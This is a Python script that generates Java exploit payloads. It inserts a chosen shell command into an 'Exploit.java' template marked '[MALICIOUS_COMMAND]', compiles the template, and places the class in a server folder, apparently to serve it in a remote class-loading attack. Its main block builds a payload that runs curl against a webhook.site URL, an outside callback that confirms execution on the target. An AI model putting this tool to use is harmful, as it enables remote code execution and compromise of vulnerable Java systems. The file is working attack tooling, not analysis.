import os
import json
import subprocess
import shutil


TEMPLATE_PATH = f"./template/Exploit.java"

def generate_exploit(command, class_name="Exploit"):
    TEMPLATE_OUT = f"./tmp/{class_name}.java"
    CLASS_OUT = f"./tmp/{class_name}.class"
    SERVER_OUT = f"./server/{class_name}.class"

    cmds = command.split(" ")
    cmds = json.dumps(cmds)[1:-1]

    script = open(TEMPLATE_PATH, 'r')
    content = script.read()
    script.close()

    # replace malicious code
    content = content.replace("[MALICIOUS_COMMAND]", cmds)
    content = content.replace("[CLASS_NAME]", class_name)

    # save in tmp folder
    with open(TEMPLATE_OUT, 'w+') as fd:
        fd.write(content)

    # compile java file
    subprocess.Popen(f'javac {TEMPLATE_OUT}', shell=True).wait()

    # check class file
    if not os.path.exists(CLASS_OUT):
        raise Exception("[!] Unable compile Java file.")

    # move class to server
    shutil.move(os.path.join(os.getcwd(), CLASS_OUT), os.path.join(os.getcwd(), SERVER_OUT))

    # delete script on tmp
    os.remove(TEMPLATE_OUT)


if __name__ == "__main__":
    # generate_exploit("curl -X GET https://webhook.site/4e29c51b-6bf1-4490-8ac1-1b5077ff77ea")
    generate_exploit("curl -X GET https://webhook.site/d2f75dcd-4d8b-4365-b7d9-6602fba1c3d1")
